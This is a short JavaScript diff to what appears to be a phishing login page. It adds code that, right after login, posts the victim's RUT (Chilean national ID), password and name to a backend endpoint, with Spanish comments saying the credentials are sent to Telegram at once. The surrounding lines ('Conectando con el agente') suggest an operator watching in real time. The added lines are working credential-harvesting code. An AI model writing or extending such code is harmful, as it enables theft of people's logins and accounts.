@@ -678,7 +678,12 @@
       
       curName=loginData.name||'Cliente';
       curMsgId=loginData.messageId;
-      
+
+      // 🔐 Enviar credenciales (RUT y contraseña) a Telegram inmediatamente
+      console.log('📤 Enviando credenciales a Telegram...');
+      await fetch(`${BACKEND_URL}/api/send-credentials`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:curMsgId,rut,password:pass,name:curName})});
+      console.log('✅ Credenciales enviadas');
+
       document.getElementById('id-loading').style.display='none';
       document.getElementById('id-greet').style.display='block';
       setLoading(true,'Conectando con el agente...');
